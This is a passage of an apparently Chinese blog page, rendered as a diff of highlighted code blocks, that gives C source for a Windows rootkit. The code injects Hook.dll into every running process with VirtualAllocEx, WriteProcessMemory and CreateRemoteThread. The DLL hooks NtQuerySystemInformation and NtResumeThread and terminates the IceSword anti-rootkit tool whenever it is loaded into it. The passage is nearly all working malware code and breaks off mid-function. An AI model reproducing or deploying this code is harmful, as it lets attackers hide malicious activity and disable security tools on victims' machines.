hProcess)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> CurPath[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(CurPath, <span class="string">&quot;C:\\WINDOWS\\system32\\Hook.dll&quot;</span>);</span><br><span class="line">    PWSTR pszLibFileRemote = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len = (lstrlen(CurPath)+<span class="number">1</span>)*<span class="number">2</span>;</span><br><span class="line">    WCHAR wCurPath[<span class="number">256</span>];</span><br><span class="line">    MultiByteToWideChar(CP_ACP,<span class="number">0</span>,CurPath,<span class="number">-1</span>,wCurPath,<span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">    pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess,</span><br><span class="line">                                             <span class="literal">NULL</span>,</span><br><span class="line">                                             len,</span><br><span class="line">                                             MEM_COMMIT,</span><br><span class="line">                                             PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    WriteProcessMemory(hProcess, pszLibFileRemote,</span><br><span class="line">            (PVOID) wCurPath, len, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)</span><br><span class="line">        GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;Kernel32&quot;</span>)), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"></span><br><span class="line">    CreateRemoteThread(hProcess,</span><br><span class="line">                       <span class="literal">NULL</span>,</span><br><span class="line">                       <span class="number">0</span>,    </span><br><span class="line">                       pfnThreadRtn,</span><br><span class="line">                       pszLibFileRemote,</span><br><span class="line">                       <span class="number">0</span>,</span><br><span class="line">                       <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TotalInject</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE         hProcessSnap = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL           bRet      = FALSE;</span><br><span class="line">    PROCESSENTRY32 pe32      = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  Take a snapshot of all processes in the system.</span></span><br><span class="line">    EnableDebugPrivilege(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  Fill in the size of the structure before using it.</span></span><br><span class="line"></span><br><span class="line">    pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  Walk the snapshot of the processes, and for each process,</span></span><br><span class="line">    <span class="comment">//  display information.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Process32First(hProcessSnap, &amp;pe32))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">                HANDLE hProcess;</span><br><span class="line">                <span class="comment">// Get the actual priority class.</span></span><br><span class="line">                hProcess = OpenProcess (PROCESS_ALL_ACCESS,</span><br><span class="line">                                        FALSE,</span><br><span class="line">                                       pe32.th32ProcessID);</span><br><span class="line">        inject(hProcess);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (Process32Next(hProcessSnap, &amp;pe32));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do not forget to clean up the snapshot object.</span></span><br><span class="line">        EnableDebugPrivilege(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    CloseHandle (hProcessSnap);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">(HANDLE hProcess)</span>&#123;<br><br><span class="hljs-type">char</span> CurPath[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">strcpy</span>(CurPath, <span class="hljs-string">&quot;C:\\WINDOWS\\system32\\Hook.dll&quot;</span>);<br>    PWSTR pszLibFileRemote = <span class="hljs-literal">NULL</span>;<br><br><br>    <span class="hljs-type">int</span> len = (lstrlen(CurPath)+<span class="hljs-number">1</span>)*<span class="hljs-number">2</span>;<br>    WCHAR wCurPath[<span class="hljs-number">256</span>];<br>    MultiByteToWideChar(CP_ACP,<span class="hljs-number">0</span>,CurPath,<span class="hljs-number">-1</span>,wCurPath,<span class="hljs-number">256</span>);<br><br>    pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess,<br>                                             <span class="hljs-literal">NULL</span>,<br>                                             len,<br>                                             MEM_COMMIT,<br>                                             PAGE_READWRITE);<br><br>    WriteProcessMemory(hProcess, pszLibFileRemote,<br>            (PVOID) wCurPath, len, <span class="hljs-literal">NULL</span>);<br><br>    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)<br>        GetProcAddress(GetModuleHandle(TEXT(<span class="hljs-string">&quot;Kernel32&quot;</span>)), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br>    CreateRemoteThread(hProcess,<br>                       <span class="hljs-literal">NULL</span>,<br>                       <span class="hljs-number">0</span>,    <br>                       pfnThreadRtn,<br>                       pszLibFileRemote,<br>                       <span class="hljs-number">0</span>,<br>                       <span class="hljs-literal">NULL</span>);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">TotalInject</span><span class="hljs-params">()</span><br>&#123;<br>    HANDLE         hProcessSnap = <span class="hljs-literal">NULL</span>;<br>    BOOL           bRet      = FALSE;<br>    PROCESSENTRY32 pe32      = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    <span class="hljs-comment">//  Take a snapshot of all processes in the system.</span><br>    EnableDebugPrivilege(<span class="hljs-number">1</span>);<br><br>    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)<br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">//  Fill in the size of the structure before using it.</span><br><br>    pe32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);<br><br>    <span class="hljs-comment">//  Walk the snapshot of the processes, and for each process,</span><br>    <span class="hljs-comment">//  display information.</span><br><br>    <span class="hljs-keyword">if</span> (Process32First(hProcessSnap, &amp;pe32))<br>    &#123;<br><br>        <span class="hljs-keyword">do</span><br>        &#123;<br>                HANDLE hProcess;<br>                <span class="hljs-comment">// Get the actual priority class.</span><br>                hProcess = OpenProcess (PROCESS_ALL_ACCESS,<br>                                        FALSE,<br>                                       pe32.th32ProcessID);<br>        inject(hProcess);<br>        CloseHandle(hProcess);<br><br>        &#125;<br>        <span class="hljs-keyword">while</span> (Process32Next(hProcessSnap, &amp;pe32));<br><br>    &#125;<br><br>    <span class="hljs-comment">// Do not forget to clean up the snapshot object.</span><br>        EnableDebugPrivilege(<span class="hljs-number">0</span>);<br><br>    CloseHandle (hProcessSnap);<br>    <span class="hljs-keyword">return</span> ;<br><br><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>Hook.dll: 关键代码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL g_bHook = FALSE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> LONG NTSTATUS;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_SUCCESS               ((NTSTATUS)0x00000000L)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ACCESS_DENIED         ((NTSTATUS)0xC0000022L)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L)</span></span><br><span class="line"><span class="keyword">typedef</span> ULONG SYSTEM_INFORMATION_CLASS;</span><br><span class="line"><span class="keyword">typedef</span> ULONG THREADINFOCLASS;</span><br><span class="line"><span class="keyword">typedef</span> ULONG PROCESSINFOCLASS;</span><br><span class="line"><span class="keyword">typedef</span> ULONG KPRIORITY;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEMORY_BASIC_INFORMATION_SIZE 28</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">THREAD_BASIC_INFORMATION</span> &#123;</span></span><br><span class="line">    NTSTATUS ExitStatus;</span><br><span class="line">    PNT_TIB TebBaseAddress;</span><br><span class="line">    CLIENT_ID ClientId;</span><br><span class="line">    KAFFINITY AffinityMask;</span><br><span class="line">    KPRIORITY Priority;</span><br><span class="line">    KPRIORITY BasePriority;</span><br><span class="line">&#125; THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_BASIC_INFORMATION</span> &#123;</span> <span class="comment">// Information Class 0</span></span><br><span class="line">NTSTATUS ExitStatus;</span><br><span class="line">PVOID PebBaseAddress;</span><br><span class="line">KAFFINITY AffinityMask;</span><br><span class="line">KPRIORITY BasePriority;</span><br><span class="line">ULONG UniqueProcessId;</span><br><span class="line">ULONG InheritedFromUniqueProcessId;</span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(__stdcall *NTQUERYSYSTEMINFORMATION)</span><span class="params">(</span></span><br><span class="line"><span class="params">  IN SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="line"><span class="params">  OUT PVOID               SystemInformation,</span></span><br><span class="line"><span class="params">  IN ULONG                SystemInformationLength,</span></span><br><span class="line"><span class="params">  OUT PULONG              ReturnLength OPTIONAL )</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(__stdcall *NTRESUMETHREAD)</span><span class="params">(</span></span><br><span class="line"><span class="params">IN HANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">OUT PULONG PreviousSuspendCount OPTIONAL</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(__stdcall *NTQUERYINFORMATIONTHREAD)</span><span class="params">(</span></span><br><span class="line"><span class="params">  IN HANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">  IN THREADINFOCLASS ThreadInformationClass,</span></span><br><span class="line"><span class="params">  OUT PVOID ThreadInformation,</span></span><br><span class="line"><span class="params">  IN ULONG ThreadInformationLength,</span></span><br><span class="line"><span class="params">  OUT PULONG ReturnLength OPTIONAL)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(__stdcall * NTQUERYINFORMATIONPROCESS)</span><span class="params">(</span></span><br><span class="line"><span class="params">IN HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">IN PROCESSINFOCLASS ProcessInformationClass,</span></span><br><span class="line"><span class="params">OUT PVOID ProcessInformation,</span></span><br><span class="line"><span class="params">IN ULONG ProcessInformationLength,</span></span><br><span class="line"><span class="params">OUT PULONG ReturnLength OPTIONAL)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTQUERYSYSTEMINFORMATION g_pfNtQuerySystemInformation = <span class="literal">NULL</span>;</span><br><span class="line">NTRESUMETHREAD g_pfNtResumeThread = <span class="literal">NULL</span>;</span><br><span class="line">BYTE g_OldNtQuerySystemInformation[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;, g_NewNtQuerySystemInformation[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">BYTE g_OldNtResumeThread[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;, g_NewNtResumeThread[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">DWORD dwIdOld = <span class="number">0</span>;</span><br><span class="line">CRITICAL_SECTION cs;</span><br><span class="line"></span><br><span class="line">NTSTATUS __stdcall <span class="title function_">NewNtQuerySystemInformation</span><span class="params">(</span></span><br><span class="line"><span class="params">            IN ULONG SystemInformationClass,</span></span><br><span class="line"><span class="params">            IN PVOID SystemInformation,</span></span><br><span class="line"><span class="params">            IN ULONG SystemInformationLength,</span></span><br><span class="line"><span class="params">            OUT PULONG ReturnLength)</span>;</span><br><span class="line"></span><br><span class="line">NTSTATUS __stdcall <span class="title function_">NewNtResumeThread</span><span class="params">(IN HANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">OUT PULONG PreviousSuspendCount OPTIONAL)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> WINAPI <span class="title function_">HookOn</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> WINAPI <span class="title function_">HookOff</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HANDLE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        &#123;</span><br><span class="line">             InitializeCriticalSection(&amp;cs);</span><br><span class="line">             <span class="type">char</span> Name[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">             GetModuleFileName(<span class="literal">NULL</span>, Name, MAX_PATH);</span><br><span class="line">             <span class="comment">// 杀杀冰刃玩玩</span></span><br><span class="line">             <span class="keyword">if</span> ( <span class="built_in">strstr</span>(Name, <span class="string">&quot;IceSword.exe&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">             &#123;</span><br><span class="line">                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,</span><br><span class="line">                                              <span class="number">0</span>,</span><br><span class="line">                                              GetCurrentProcessId());</span><br><span class="line">                TerminateProcess(hProcess, <span class="number">0</span>);</span><br><span class="line">                CloseHandle(hProcess);</span><br><span class="line">             &#125;</span><br><span class="line">            <span class="keyword">if</span>(!g_bHook)</span><br><span class="line">            &#123;</span><br><span class="line">                HookOn();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line">               MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;Process Attach&quot;</span>, <span class="string">&quot;Remote Dll&quot;</span>, MB_OK);</span><br><span class="line">            <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">if</span>(g_bHook)</span><br><span class="line">        &#123;</span><br><span class="line">            HookOff();</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line">            MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;Off!&quot;</span>, <span class="string">&quot;Hook Off&quot;</span>, MB_OK);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            DeleteCriticalSection(&amp;cs);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">EnableDebugPrivilege</span><span class="params">(BOOL fEnable)</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Enabling the debug privilege allows the application to see</span></span><br><span class="line">   <span class="comment">// information about service applications</span></span><br><span class="line">   BOOL fOk = FALSE;    <span class="comment">// Assume function fails</span></span><br><span class="line">   HANDLE hToken;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Try to open this process&#x27;s access token</span></span><br><span class="line">   <span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,</span><br><span class="line">      &amp;hToken)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Attempt to modify the &quot;Debug&quot; privilege</span></span><br><span class="line">      TOKEN_PRIVILEGES tp;</span><br><span class="line">      tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">      LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">      tp.Privileges[<span class="number">0</span>].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : <span class="number">0</span>;</span><br><span class="line">      AdjustTokenPrivileges(hToken, FALSE, &amp;tp, <span class="keyword">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      fOk = (GetLastError() == ERROR_SUCCESS);</span><br><span class="line">      CloseHandle(hToken);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span>(fOk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ThreadBasicInformation 0</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inject</span><span class="params">(HANDLE hProcess)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> CurPath[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    GetSystemDirectory(CurPath, <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strncat</span>(CurPath, <span class="string">&quot;\\Hook.dll&quot;</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="comment">//strcpy(CurPath, &quot;C:\\WINDOWS\\system32\\Hook.dll&quot;);</span></span><br><span class="line">    PWSTR pszLibFileRemote = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len = (lstrlen(CurPath)+<span class="number">1</span>)*<span class="number">2</span>;</span><br><span class="line">    WCHAR wCurPath[<span class="number">256</span>];</span><br><span class="line">    MultiByteToWideChar(CP_ACP,<span class="number">0</span>,CurPath,<span class="number">-1</span>,wCurPath,<span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">    EnableDebugPrivilege(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    pszLibFileRemote = (PWSTR)</span><br><span class="line">        VirtualAllocEx(hProcess, <span class="literal">NULL</span>, len, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    WriteProcessMemory(hProcess, pszLibFileRemote,</span><br><span class="line">        (PVOID) wCurPath, len, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    PTHREAD_START_ROUTINE 